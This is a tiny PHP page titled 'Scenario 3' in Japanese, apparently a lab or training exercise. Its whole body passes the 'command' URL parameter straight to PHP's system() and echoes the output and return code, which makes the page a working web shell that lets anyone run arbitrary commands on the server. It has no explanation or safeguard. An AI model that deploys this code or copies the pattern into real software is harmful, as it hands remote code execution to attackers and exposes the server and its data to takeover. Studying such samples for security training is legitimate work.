<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>シナリオ3</title>
</head>
<body>
    <?php
            $last_line = system($_GET["command"], $retval); 
            echo $last_line;
            echo $retval;
    ?>
</body>
</html>